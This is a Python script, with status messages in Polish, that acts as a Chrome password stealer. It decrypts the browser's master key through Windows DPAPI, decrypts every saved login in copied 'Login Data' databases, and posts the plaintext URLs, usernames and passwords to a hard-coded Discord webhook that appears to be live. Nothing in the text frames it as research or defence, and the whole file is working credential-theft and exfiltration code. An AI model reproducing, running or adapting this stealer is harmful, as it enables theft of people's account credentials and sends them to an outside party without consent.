
import json
import base64
import sqlite3
import os
import shutil
import requests
from Crypto.Cipher import AES
import win32crypt

def get_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            return decrypted
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"❌ {str(e)}"

def extract_passwords(db_path, key):
    temp_path = "temp_chrome.db"
    shutil.copy(db_path, temp_path)
    passwords = []
    try:
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        print(f"🔍 {os.path.basename(db_path)}: {len(rows)} rekordów")
        for row in rows:
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, key)
            passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")
        conn.close()
    except Exception as e:
        print(f"❌ Błąd przy {db_path}: {str(e)}")
    finally:
        os.remove(temp_path)
    return passwords

def send_to_webhook(webhook_url, content, profile_name):
    if not content:
        return
    chunk = "\n".join(content)
    if len(chunk) > 1900:
        chunk = chunk[:1900] + "\n[truncated]"
    payload = {"content": f"🔐 Hasła z profilu `{profile_name}`:\n```{chunk}```"}
    try:
        response = requests.post(webhook_url, json=payload)
        return response.status_code
    except Exception as e:
        print(f"❌ Webhook error: {str(e)}")

if __name__ == "__main__":
    base_path = os.path.expanduser(r"~\Documents\ChromeDump")
    webhook_url = "https://discord.com/api/webhooks/1360942792540684438/8GkVbhnI8fPO6c8yeYN59KLuNAvCem_-50Bef334UkPn_gMrYMA0DWd3RxyliUPq6R8L"
    key_path = os.path.join(base_path, "key.txt")

    if not os.path.exists(key_path):
        print("❌ Nie znaleziono pliku key.txt")
        exit()

    key = get_key(key_path)

    for file in os.listdir(base_path):
        if file.endswith("_LoginData"):
            full_path = os.path.join(base_path, file)
            profile_name = file.replace("_LoginData", "")
            passwords = extract_passwords(full_path, key)
            send_to_webhook(webhook_url, passwords, profile_name)
